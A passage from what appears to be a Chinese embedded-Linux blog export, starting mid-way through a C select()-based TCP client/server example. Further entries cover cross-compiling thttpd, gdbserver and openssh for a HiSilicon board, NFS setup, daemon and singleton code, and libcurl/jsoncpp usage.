    char  SendMsg[] = &#123;"Hello Server"&#125;;
    char RecBuf[100] = &#123;0&#125;;
    fd_set rec_set;
    FD_ZERO(&amp;rec_set);  
    FD_SET(fd, &amp;rec_set);  

    while (1)
    &#123;
        //ssize_t write(int fd, const void *buf, size_t count);
        if ( 0 > write(fd, SendMsg, sizeof(SendMsg)) )&#123;

            printf("write failed\n");
        &#125;

        timeout.tv_sec = 5;   
        timeout.tv_usec = 0;  
        //int select(int nfds, fd_set *readfds, fd_set *writefds,\
            fd_set *exceptfds, struct timeval *timeout);
        ret = select(fd + 1, &amp;rec_set, NULL, NULL, &amp;timeout); 
        //select返回表示检测到可读事件 
        switch(ret)&#123;
            case 0:&#123;
                printf("select timeout!\n");
                break;
            &#125;
            case -1:&#123;
                perror("select error:");
                return -1;
                break;
            &#125;
            default:&#123;
                //ssize_t read(int fd, void *buf, size_t count);
                read(fd, RecBuf, sizeof(SendMsg));
                printf("RecBuf:%s\n",RecBuf);
                sleep(1);
            &#125;
        &#125;
    &#125;
    close(fd);
    return 0;
&#125;

server.c
#include &lt;stdio.h>
#include &lt;unistd.h>
#include &lt;sys/types.h> /* See NOTES */
#include &lt;sys/socket.h>

#include &lt;errno.h>
#include &lt;string.h>

#include &lt;arpa/inet.h>

#include &lt;sys/select.h>

/* According to earlier standards */
#include &lt;sys/time.h>
#include &lt;sys/types.h>

#include &lt;sys/select.h>



#define TARGETPORT 6666
#define TARGETIP "127.0.0.1"
typedef struct _MyFdSet
&#123;
    int FdNum;
    int AllFdSet[FD_SETSIZE];
&#125; MyFdSet;

void MyFdSet_INSERT(MyFdSet *set, int fd)&#123;

    set->AllFdSet[set->FdNum] = fd; 
    set->FdNum++;    
&#125;

int  MyFdSet_GETMAX(MyFdSet *set)&#123;

    int i = 1;
    int max_fd = set->AllFdSet[0];
    for ( ; i &lt; set->FdNum; i ++) &#123; 
        if ( max_fd &lt; set->AllFdSet[i])&#123;
            max_fd = set->AllFdSet[i];
        &#125;
    &#125;
    return max_fd;
&#125;

void MyFdSet_REMOVE(MyFdSet * set,int fd) &#123;

    MyFdSet tmp;
    tmp.FdNum = 0;

    int i = 0;
    for ( ; i &lt; set->FdNum; i++ )&#123;
        if ( fd != set->AllFdSet[i] )&#123;
            tmp.AllFdSet[tmp.FdNum] = set->AllFdSet[i];
            tmp.FdNum++;
        &#125;
    &#125;

    set->FdNum = tmp.FdNum;
    for ( i = 0; i &lt; set->FdNum; i++)&#123;
        set->AllFdSet[i] = tmp.AllFdSet[i];
    &#125;
&#125;

int main(int argc, char *argv[])
    &#123;

        int fd;
        if (0 > (fd = socket(AF_INET, SOCK_STREAM, 0)))
        &#123;

            perror("socket error:");
            return -1;
        &#125;

        struct sockaddr_in addr;
        struct sockaddr_in client_addr;

        memset(&amp;addr, 0, sizeof(struct sockaddr_in));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(TARGETPORT);
        addr.sin_addr.s_addr = htonl(INADDR_ANY);
        //   int bind(int sockfd, const struct sockaddr *addr,\
        socklen_t addrlen);
        if (0 > bind(fd, (const struct sockaddr *)&amp;addr, sizeof(struct sockaddr)))
        &#123;

            perror("bind error:");
            return -1;
        &#125;
        //int listen(int sockfd, int backlog);
        if (0 > listen(fd, 5))
        &#123;

            perror("bind error:");
            return -1;
        &#125;
        fd_set ser_set;
        FD_ZERO(&amp;ser_set);
        FD_SET(fd, &amp;ser_set);
        struct timeval timeout;
        int ret;

        MyFdSet myfdset = &#123;0,&#123;0&#125;&#125;;

        MyFdSet_INSERT(&amp;myfdset, fd);
        char RecBuf[100];
        char SendMsg[] = &#123;"Hello Client"&#125;; 

        while (1)
        &#123;
            int n = 0;
            FD_ZERO(&amp;ser_set);
            for ( ; n &lt; myfdset.FdNum; n++)&#123;

                FD_SET(myfdset.AllFdSet[n], &amp;ser_set);
                printf("exist fd %d\n",myfdset.AllFdSet[n]);
            &#125;
            timeout.tv_sec = 5;
            timeout.tv_usec = 0;
            //int select(int nfds, fd_set *readfds, fd_set *writefds,\
            fd_set *exceptfds, struct timeval *timeout);
            ret = select( MyFdSet_GETMAX(&amp;myfdset) + 1, &amp;ser_set, NULL, NULL, &amp;timeout);
            switch (ret)
            &#123;
            case 0:
            &#123;
                printf("select timeout!\n");
                break;
            &#125;
            case -1:
            &#123;
                perror("select error:");
                return -1;
                break;
            &#125;
            default:
            &#123;  
               int i = 0;
               for ( ; i &lt; myfdset.FdNum; i ++ )&#123;

                    if (FD_ISSET(myfdset.AllFdSet[i], &amp;ser_set))&#123;

                        if ( fd == myfdset.AllFdSet[i] )&#123;//client connect
                            
                            int c_fd;
                            int client_addr_len = sizeof(struct sockaddr);
                            if ( 0  >  (c_fd = accept(fd, (struct sockaddr*)&amp;client_addr, &amp;client_addr_len)) )&#123;

                                perror("accept error:");
                                break;
                            &#125;

                            printf("client ip:%s,port:%d\n", inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
                            MyFdSet_INSERT(&amp;myfdset, c_fd);
                            FD_SET(c_fd, &amp;ser_set);
                            break;
                        &#125;
                        else&#123;//client sent datas in buf
                            
                            ret = read(myfdset.AllFdSet[i], RecBuf, sizeof(SendMsg));
                            if ( 0 > ret )&#123;
                                
                                MyFdSet_REMOVE(&amp;myfdset, myfdset.AllFdSet[i]);
                                close(myfdset.AllFdSet[i]);
                                perror("read error:");
                                break;
                            &#125;
                            else if( ret == 0 )&#123;//client disconnected
                                
                                MyFdSet_REMOVE(&amp;myfdset, myfdset.AllFdSet[i]);
                                close(myfdset.AllFdSet[i]);
                                printf("client disconnected\n");
                                break;
                            &#125;
                            else&#123;

                                printf("RecMsg:%s\n", RecBuf);
                                write(myfdset.AllFdSet[i], SendMsg, sizeof(SendMsg));
                            &#125;
                        &#125;
                    &#125;
               &#125;
               sleep(1);
            &#125;
            &#125;
        &#125;

        int i;
        for ( i = 0; i &lt; myfdset.FdNum; i++ )&#123;//close fd

            close(myfdset.AllFdSet[i]);
        &#125;
        return 0;
    &#125;
  直接gcc client.c -o client gcc server.c -o server 就可以使用了




后记

  无
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>linux开发</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>socket</tag>
        <tag>select</tag>
        <tag>cs</tag>
        <tag>tcp</tag>
      </tags>
  </entry>
  <entry>
    <title>thttpd 2.27（最新）移植指南（官方安装脚本好多坑，我只想说）</title>
    <url>/2017/09/07/blog_idx_040/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  Date:Thu Sep  7 10:38:53 CST 2017
  Version:Linux  3.10.40 #43 SMP PREEMPT Thu Aug 17 11:42:21 CST 2017 armv7l armv7l armv7l GNU/Linux
前言

  无




httpd

  最近需要在板子上移植一个小型的web服务器，所以选用了thttpd这个小玩意儿。(下文中出现的A代表目标路径)
  这类带configure脚本的程序都是一个流程。直接:
./configure --prefix=A
make -j 4
make install 
  在最后一步，问题多的爆炸（不知道是不是我指定了特殊安装路径造成的）。


无www用户组，直接sudo groupadd www添加



    
        
    
  


目标目录无man1目录，直接sudo mkdir -p A/man/man1



    
        
    
 


目标目录无thttpd.conf文件，直接从源码中带的拷贝到当前目录



    
        
    



建立网页资源目录,并写入一个Index.html文件


sudo mkdir A/html 
sudo chmod +755 html
echo "Hello Sky Hello World" >> html/index.html
sudo chmod +644 html/index.html


无httpd用户，sudo useradd httpd


改一下端口，80口可能随时被占用了。（thttp.conf）



    
        
    



改目标资源网页目录（thttp.conf）



    
        
    

  到这里坑填的差不多了，直接root用户下,
./thttpd -C thttpd.conf
ps -aux | grep thttpd看一下是否正常启动

    
        
    

  最后看效果：

    
        
    

  题外话，CGI这类的配置网上主流的教程可以用




后记

  无
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>嵌入式</category>
        <category>linux开发</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>移植</tag>
        <tag>HTTP服务器</tag>
        <tag>thttpd</tag>
      </tags>
  </entry>
  <entry>
    <title>GdbServer和libuuid移植到HISI3520d</title>
    <url>/2017/09/21/blog_idx_042/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  Linux 4.10.0-35-generic #39~16.04.1-Ubuntu SMP Wed Sep 13 09:02:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
前言

  我们用的这个板子，NAND是32MB，除去uboot，kernel，根文件系统总大小11MB(没有使用完NAND)，所以对于这一点容量，导致了我们得省着点用才行。对于板子上的一个程序，当它出问题后，我们没有任何办法调试，因为移植一个gdb上去太大了。so，我们便想着移植一个gdbserver来远程调试。libuuid是这个我们要调试的目标程序需要。




GdbServer和libuuid移植



首先移植gdbserver，从下面地址下载，http://www.gnu.org/software/gdb/download/。直接解压，进入源码目录。


    1. 先生成对应的GDB。(注意这是在宿主机上运行，而不是板子，一定要指定target,此target一定要和gdbserver一致，不然可能出现未知的问题)
./configure --target=arm-hisiv400-linux --prefix=/home/xxx/xxx
make
make install 
    2. 生成对应的GdbServer，进入到源码根目录，在进入gdb/gdbserver/。
./configure  --target=arm-hisiv400-linux  --host=arm-hisiv400-linux
make 



首先下载libuuid，https://sourceforge.net/projects/libuuid/。解压，进入源码目录。


./configure --host=arm-hisiv400-linux  --enable-shared --prefix=/home/xxx/xxx
make 
make install 





后记

  无
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>嵌入式</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>移植</tag>
      </tags>
  </entry>
  <entry>
    <title>移植openssh-7.5p1(包括openssl-1.0.2l、zlib-1.2.11)到HISI3520d（编译篇）</title>
    <url>/2017/09/20/blog_idx_041/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  HOST:
    Linux 4.10.0-35-generic #39~16.04.1-Ubuntu SMP Wed Sep 13 09:02:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
  TARGET:
    arm-hisiv400-linux-gnueabi 工具链，GLIBC-Kernel
前言

  最近有个项目是使用的hisiv3520d的片子，按照官方SDK移植好了glibc-kernel之后，准备进行后期的开发。但是这块板子只有一个调试串口，多个同事就不能够同时使用这块板子，所以，就有了移植openssh的想法。




移植Openssh



首先配置好官方的SDK，工具链必须是hisiv400的，这个工具链是glibc版本的，同时为了保持和内核的兼容性。


首先找到当前openssh的稳定版本，下载地址为下面的地址，版本为7.5p1
ftp://mirror.internode.on.net/pub/OpenBSD/OpenSSH/portable/
下载解压后，这里有一个文件希望大家在移植前先读一读根目录下一个叫做INSTALL的文本文件，特别是关于依赖的zlib和openssl兼容版本部分（下图已圈出重点）。下面是截图：



    
        
    
  
  友情提示：一定要选择  《  版本合适  》  的zlib和openssl，不然最后编译不过openssh，我就是踩了这个坑。


移植openssl-1.0.2l,下载地址（https://www.openssl.org/source/）。这里很多网上的交叉编译方法答案都比较的乱，个人感觉有点复杂，都没有仔细的去读INSTALL文件。


  其实直接执行:
./config no-asm shared --prefix=/home/sky/hisi3520d/Work/install --cross-compile-prefix=arm-hisiv400-linux-gnueabi-
  我就不对这些参数一一说明了，这些参数的说明来自于Configure和INSTALL这个文件。非常全，下面是节选的部分说明。
# --prefix      prefix for the OpenSSL include, lib and bin directories
# --cross-compile-prefix Add specified prefix to binutils components.
# no-asm        do not use assembler
# shared        In addition to the usual static libraries, create # shared libraries on platforms where it's supported.  

  这里，我们需要查找自己要移植的芯片的arm架构版本，并且修改.config里面的有个叫做GUESSOS的变量。我看它脚本里面写的TARGET名字的规则（如下图），就自己定义一个合理的值给GUESSOS（这里很烦的，这个东西猜不准我的目标架构）
  比如我给的值就是GUESSOS=armv7-hisi-3520d-linux2,中间的随意填，只要注意他的命名规则就好了

    
        
    
  
  然后，make ,make install 就好了(其实有兴趣的可以去研究那个叫做Configure的文件，并直接执行这个脚本就可以配置完成了，但是在linux下，这样不推荐，config脚本也是调用的Configure的那个脚本)
2019/5/17更新
  关于交叉编译，其实其INSTALL文件中有一段说明：

    
        
    
  
  意思就是让我们直接修改Configure脚本，然后得到自己想要的架构的库。经过一番研究发现，大概需要如下步骤：
    1 首先查看适合你的架构

    
        
    
  
  这里的话，我板子是armv7的，所以我选择linux-armv4，如果是64位的，就选择linux-aarch64.
  但是这样还不够，因为我们还需要指定编译相关的工具名字，这里需要直接去修改Cofigure脚本。
    2 修改如下：

    
        
    
  
    3 然后执行:./Configure linux-armv4 --prefix=xxx shared
    4 make -j 16 &amp;&amp; make install


移植zlib-1.2.11，下载地址(http://www.zlib.net/)，这个我没有找到好的方法，只有通过原始的改Makefile来实现。首先


./config --prefix=/.../.../.../zlib_install
  把makefile里面的CC,LDSHARED,CPP,AR,RANLIB等变量中编译链接相关的东西，改为交叉工具链中对应的东西。然后make,make install


开始正题。


./configure --host=arm-hisiv400-linux-gnueabi --with-libs --with-zlib=/home/sky/hisi3520d/Work/install --with-ssl-dir=/home/sky/hisi3520d/Work/install --disable-etc-default-login CC=arm-hisiv400-linux-gnueabi-gcc AR=arm-hisiv400-linux-gnueabi-ar
  然后make就可以了。最终生成的openssh相关的可执行程序在根目录。
特此说明：configure 脚本可通过–prefix参数来配置实际的安装目录，编译生成的程序写死这个目录，若不想使用默认的配置，建议使用此参数配置
最后相关的安装步骤在：http://blog.csdn.net/u011728480/article/details/78969958




后记

  无
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>嵌入式</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>移植</tag>
        <tag>openssh</tag>
        <tag>openssl</tag>
        <tag>zlib</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu 16.04 配置NFS</title>
    <url>/2017/09/30/blog_idx_043/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  Linux 4.10.0-35-generic #39~16.04.1-Ubuntu SMP Wed Sep 13 09:02:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
前言

  最近太TNND忙了，好多东西都没有办法记录，只能等待闲暇时来记录。
  最近项目上用了一个牛逼的核心板子，整个NAND本来总大小为2G，结果TMD官方给的资料居然只启用了32MB，心都在滴血啊，uboot 1MB，kernel 4MB，剩余20+MB简直了，因为我们要跑一个大一点点的程序，什么都移植不上去，分分钟空间就不够用了。所以没有办法，只有弄一个NFS来先凑合着（其实NFS对于调试来说，还是非常爽的，及其方便）。




NFS配置



sudo apt-get install nfs-kernel-server #直接装就好了，其中，apt会给你自动解决依赖，主要是nfs-common  rpcbind 这两个包。


vim /etc/exports #修改配置文件，并在文件末行添加：


   要挂载的绝对目录 *(rw,sync,no_root_squash,no_subtree_check)
   规则：目录 ip（权限）
example：
/home/xxx/nfsroot  *(rw,sync,no_root_squash,no_subtree_check)


注意，要在嵌入式板子上挂载nfs,mount需要-o nolock 参数,nfs对挂载目录存在文件锁，把文件锁放在板子端，避免冲突。


example：
mount -t nfs -o nolock 192.168.31.137:/home/xxxx/nfs_rootfs /nfsroot/
注意:配置完配置文件后，可通过重启系统以及重启nfs服务来使配置生效




后记

  无
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>Ubuntu使用</category>
        <category>嵌入式</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
        <tag>linux</tag>
        <tag>nfs</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux Daemon &amp; 单例模式 设计与实现</title>
    <url>/2017/11/17/blog_idx_044/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  无




Linux Daemo 和 单例模式



Linux 单例模式
  原理：创建一个保存进程名的文件，利用linux的文件锁来判断文件是否加锁来判断是否已有相同的程序运行。
例子
int CheckIsSingleton(int *fd)
&#123;

    struct flock loglock;  
    char nowpid[10];
    int num;

    if (0 > (*fd = open(LOCK_FILE_NAME, O_WRONLY | O_CREAT, 0600)))
    &#123;

        perror("open lock file failed!");
        return -1;
    &#125;
    /*

struct flock &#123;
               ...
               short l_type;    // Type of lock: F_RDLCK,
                                   //F_WRLCK, F_UNLCK 
               short l_whence;  // How to interpret l_start:
                                //SEEK_SET, SEEK_CUR, SEEK_END 
               off_t l_start;   // Starting offset for lock 
               off_t l_len;     // Number of bytes to lock 
               pid_t l_pid;     // PID of process blocking our lock
                                  // (set by F_GETLK and F_OFD_GETLK) 
               ...
           &#125;;

       As well as being removed by an explicit F_UNLCK, record locks are auto‐
       matically released when the process terminates.


*/
    memset(&amp;loglock, 0, sizeof(struct flock));
    loglock.l_type = F_WRLCK;
    loglock.l_whence = SEEK_SET;
    if ( 0 >  fcntl(*fd, F_GETLK, &amp;loglock) )&#123;//检查是否能够加F_WRLCK锁，不能够确认文件是否有锁。
    
            close(*fd);
            perror("fcntl F_WRLCK failed");
            _exit(-1);
    &#125;
    else&#123;

        if ( loglock.l_type != F_UNLCK)&#123;

            close(*fd);
            write(2,"check F_WRLCK failed\n",sizeof("check F_WRLCK failed\n"));//stdout was closed!!!
            write(2,"The same process is running\n",sizeof("The same process is running\n"));
            _exit(-1);
        &#125;
    &#125;
    loglock.l_type = F_WRLCK;
    loglock.l_start = 0;  //从文件开始加锁
    loglock.l_whence = SEEK_SET;  
    loglock.l_len = 0; //加锁整个文件
    if ( 0 >  fcntl(*fd, F_SETLK, &amp;loglock) )&#123;

        close(*fd);
        perror("fcntl F_WRLCK failed");
        printf("The same process is running\n");
        _exit(-1);
    &#125;

    num = sprintf(nowpid, "%d",getpid());
    write(*fd, nowpid, num);
    return 0;
&#125;


Daemon 简单设计
  原理


利用fork来实现。setsid使当前子进程成为新的进程组长，在使用fork使其与终端脱离，设置工作目录，设置文件掩码


利用系统提供的daemon（）（此调用来至于glibc）来完成功能。（底层使用fork来实现）
  例子


void CreateDaemonProcess_daemon()//根据daemon函数的源码来看，后面补充了一个fork比较安全
&#123;
    /*
       The daemon() function is for programs wishing to detach themselves from
       the controlling terminal and run in the background as system daemons.

       If nochdir is zero, daemon()  changes  the  process's  current  working
       directory  to  the root directory ("/"); otherwise, the current working
       directory is left unchanged.

       If noclose is zero, daemon() redirects standard input, standard  output
       and  standard  error  to  /dev/null;  otherwise, no changes are made to
       these file descriptors.

int
daemon(nochdir, noclose)
    int nochdir, noclose;
&#123;
    int fd;
 
    switch (__fork()) &#123;
    case -1:
        return (-1);
    case 0:
        break;
    default:
        _exit(0);
    &#125;
 
    if (__setsid() == -1)
        return (-1);
 
    if (!nochdir)
        (void)__chdir("/");
 
    if (!noclose) &#123;
        struct stat64 st;
 
        if ((fd = open_not_cancel(_PATH_DEVNULL, O_RDWR, 0)) != -1
            &amp;&amp; (__builtin_expect (__fxstat64 (_STAT_VER, fd, &amp;st), 0)
            == 0)) &#123;
            if (__builtin_expect (S_ISCHR (st.st_mode), 1) != 0
#if defined DEV_NULL_MAJOR &amp;&amp; defined DEV_NULL_MINOR
                &amp;&amp; (st.st_rdev
                == makedev (DEV_NULL_MAJOR, DEV_NULL_MINOR))
#endif
                ) &#123;
                (void)__dup2(fd, STDIN_FILENO);
                (void)__dup2(fd, STDOUT_FILENO);
                (void)__dup2(fd, STDERR_FILENO);
                if (fd > 2)
                    (void)__close (fd);
            &#125; else &#123;
                // We must set an errno value since no
                 //  function call actually failed.  
                close_not_cancel_no_status (fd);
                __set_errno (ENODEV);
                return -1;
            &#125;
        &#125; else &#123;
            close_not_cancel_no_status (fd);
            return -1;
        &#125;
    &#125;
    return (0);
&#125;

*/
    if (0 > daemon(0, 0))
    &#123;

        perror("daemon call failed!");
        _exit(-1);
    &#125;
    //setsid();
    // int fd;
    // if ( 0 > (fd = open("/dev/tty", O_RDWR )) )&#123;

    //     perror("open tty failed!");
    //     _exit(-1);
    // &#125;

    // if ( ioctl(fd, TIOCNOTTY, NULL) &lt; 0)&#123;

    //     perror("ioctl TIOCNOTTY failed!");
    //     close(fd);
    //     _exit(-1);
    // &#125;
    // close(fd);

    int pid;
    pid = fork();
    if (pid == -1)
    &#123;

        perror("fork first error!");
    &#125;
    else if (pid > 0)
    &#123; //parent 1

        _exit(1);
    &#125;
    else
    &#123; //child pid==0
    &#125;
    return;
&#125;


void CreateDaemonProcess_Fork()
&#123;

    pid_t pid, pid1, pid2;

    pid = fork();

    if (pid == -1)
    &#123;

        perror("fork first error!");
    &#125;
    else if (pid > 0)
    &#123; //parent 1

        _exit(1);
    &#125;
    else
    &#123; //child pid==0

        if (0 > (pid1 = setsid()))
        &#123;
            perror("setsid() call failed!");
            _exit(-1); //
        &#125;
        else
        &#123;
            printf("New session id is %d\n", pid1);
        &#125;

        pid2 = fork();

        if (pid2 == -1)
        &#123;

            perror("fork second error!");
        &#125;
        else if (pid2 > 0)
        &#123; //parent

            _exit(1);
        &#125;
        else
        &#123;
            chdir("/"); //change current working directory
            umask(0);
            return;
        &#125;
    &#125;
&#125;
  说明：


双fork的原因是进程组长会开启终端。而我们的daemon程序是不需要终端的。


文件掩码用于设置默认的文件权限。


子进程会继承父进程的大部分属性，包括已打开文件描述符、文件掩码、工作目录等待，这些根据需求处理。






后记

  无
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>linux开发</category>
        <category>C&amp;CPP</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>daemon</tag>
        <tag>singleton</tag>
      </tags>
  </entry>
  <entry>
    <title>Libcurl &amp; Log4cplus 移植和使用 以及 Jsoncpp 简单使用</title>
    <url>/2017/11/20/blog_idx_045/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  无




Libcurl篇（curl-7.55.1.tar.gz）



移植Libcurl
  我首先看了一下其目录结构，里面存在两套编译结构，一个是依赖于CMake，一个是依赖于Autoconf。
  这里使用的是Autoconf。
./configure --prefix=你的安装绝对路径 --host=arm-linux-gnueabi --target=arm-linux-gnueabi CXX=arm-linux-gnueabi-g++ CC=arm-linux-gnueabi-gcc
make -j16
make install
  说明：–prefix 指定安装路径， --host以及–target指定目标架构， CC和CXX变量指定了工具链


使用Libcurl
curl_global_init
curl_easy_init
curl_easy_setopt
//CURLOPT_HTTPHEADER 设置头信息
//CURLOPT_URL 设置url信息
//CURLOPT_POST 设置本次http请求方式是否为post
//CURLOPT_POSTFIELDS 设置post 数据域
//CURLOPT_WRITEFUNCTION 设置http返回信息的回调函数
//CURLOPT_WRITEDATA 设置回调函数中，userdata的数据内存
curl_easy_perform
curl_easy_cleanup
curl_global_cleanup
int yUpgrade::ReportUpgradeStatus(const std::string &amp; str)&#123;
    
   &#x2F;&#x2F; InitLibCurl(ycurl);

    if ( CURLE_OK !&#x3D; (res &#x3D; curl_global_init(CURL_GLOBAL_ALL)) )&#123;
    std::cout&lt;&lt;&quot;curl_global_init call  failed &quot;&lt;&lt;std::endl;
    return -1;
    &#125; 
    if ( !( ycurl &#x3D; curl_easy_init() ) )&#123;
    std::cout&lt;&lt;&quot;curl_easy_init call  failed &quot;&lt;&lt;std::endl;
    return -1;
    &#125;

    struct curl_slist *headers &#x3D; NULL;
    headers&#x3D;curl_slist_append(headers, &quot;Content-Type:application&#x2F;json&quot;);
    headers&#x3D;curl_slist_append(headers, &quot;Accept:application&#x2F;json&quot;);
    headers &#x3D; curl_slist_append(headers, &quot;charset:utf-8&quot;);
    
    curl_easy_setopt(ycurl, CURLOPT_HTTPHEADER, headers);
    &#x2F;&#x2F;headers &#x3D; curl_slist_append(headers, &quot;Accept: Agent-007&quot;);
    &#x2F;&#x2F;curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    curl_easy_setopt(ycurl, CURLOPT_URL, REPORTUPGRADESTATUS_URL);
     &#x2F;&#x2F;curl_easy_setopt(curl,  CURLOPT_CUSTOMREQUEST, &quot;POST&quot;);&#x2F;&#x2F;自定义请求方式
    curl_easy_setopt(ycurl, CURLOPT_POST, 1);&#x2F;&#x2F;设置为非0表示本次操作为POS

    &#x2F;&#x2F;curl_easy_setopt(ycurl, CURLOPT_POSTFIELDSIZE, str.size());&#x2F;&#x2F;设置上传json串长度,这个设置可以忽略
    curl_easy_setopt(ycurl, CURLOPT_POSTFIELDS, str.c_str()); 

    curl_easy_setopt(ycurl, CURLOPT_WRITEFUNCTION, write_callback);&#x2F;&#x2F;设置回调函数
    curl_easy_setopt(ycurl, CURLOPT_WRITEDATA, RecCharBuf);&#x2F;&#x2F;设置写数据

    if ( CURLE_OK !&#x3D;  (res &#x3D; curl_easy_perform(ycurl)) )&#123;

        CleanUpLibCurl(ycurl);
        curl_slist_free_all(headers);
        std::cout&lt;&lt;&quot;curl_easy_perform call  failed,Res&#x3D; &quot;&lt;&lt;res&lt;&lt;std::endl;
        return -1;
    &#125;


    CleanUpLibCurl(ycurl);
    curl_slist_free_all(headers);
    return 0;
&#125;




Log4cplus篇（log4cplus-1.2.1-rc2.7z）



移植Log4cplus
./configure --host=arm-linux-gnueabi --target=arm-linux-gnueabi CC=arm-hisiv400-linux-gcc CXX=arm-hisiv400-linux-g++
make -j8
make install


Log4cplus的使用（网上去找教程就可以了，一大堆，推荐使用加载配置文件的方式，不要在程序中配置）


PropertyConfigurator 类来加载配置文件


然后正常使用就可以了






Jsoncpp篇（1.8.3）



Jsoncpp的简单使用（注意，Jsoncpp更新了，有些接口不推荐了，但是可以用，网上大部分的教程都是旧版的，这里我会给出新的和旧的的使用）.这里只有读的。写的类似。
	std::string G4FileUrl;
	&#x2F;&#x2F; Json::CharReader *tmp ;
    &#x2F;&#x2F; Json::CharReaderBuilder * ptmp &#x3D;  new Json::CharReaderBuilder();
    &#x2F;&#x2F; tmp &#x3D; ptmp-&gt;newCharReader();
    &#x2F;&#x2F;tmp-&gt;parse(upgrade.RecStr,root1)
    Json::Reader UpGradeInfo;
    Json::Value root1;
    UpGradeInfo.parse(upgrade.RecStr,root1)
    G4FileUrl &#x3D; root1[&quot;fileInfo&quot;][&quot;fileUrl&quot;].asString();
    &#x2F;*例子json结构
&#123;
&quot;fileInfo&quot;:&#123;
&quot;id&quot;:&#123;&quot;timestamp&quot;:1508143624,&quot;machineIdentifier&quot;:439847,&quot;processIdentifier&quot;:524,
&quot;counter&quot;:15004360&#125;,
&quot;fileUrl&quot;:&quot;http:&#x2F;&#x2F;xxxxxxxxx&#x2F;group1&#x2F;M00&#x2F;00&#x2F;35&#x2F;wKgfdVnkcgiAVnsqAAHEhu0PItU720.jpg&quot;,
&quot;fileName&quot;:&quot;TX.jpg&quot;,
&quot;fileType&quot;:4,
&quot;cameraId&quot;:0,
&quot;addedDate&quot;:&quot;Oct 16, 2017 4:47:04 PM&quot;&#125;
	&#125;
&#125;
*&#x2F;
  说明，如果使用旧版接口，gcc会报warning: ‘Reader’ is deprecated: Use CharReader and CharReaderBuilder instead [-Wdeprecated-declarations]，msvc (//  MSVC 2008 以上 )会报error。




后记

  无
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>嵌入式</category>
        <category>linux开发</category>
      </categories>
      <tags>
        <tag>移植</tag>
        <tag>libcurl</tag>
        <tag>log4cplus</tag>
        <tag>jsoncpp</tag>
      </tags>
  </entry>
  <entry>
    <title>LeNet-5 论文及原理分析(笨鸟角度)</title>
    <url>/2017/12/15/blog_idx_047/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  Notes:本人此前只对opencv处理图像有一定的了解。
  从毕业后开始，自己工作的周围就出现了无数次计算机视觉相关的内容。而我的工作也和这些有一定的交叉。虽然在学校对并行计算以及AI有一定所闻，但是都只是听说而已，以为离我们还很远，出来才知道，它们已经来了。此文由网上众多Lenet-5相关的文章和论文原文经过我的组合和理解后写出，只作为我的一个学习笔记。




LeNet-5 分析
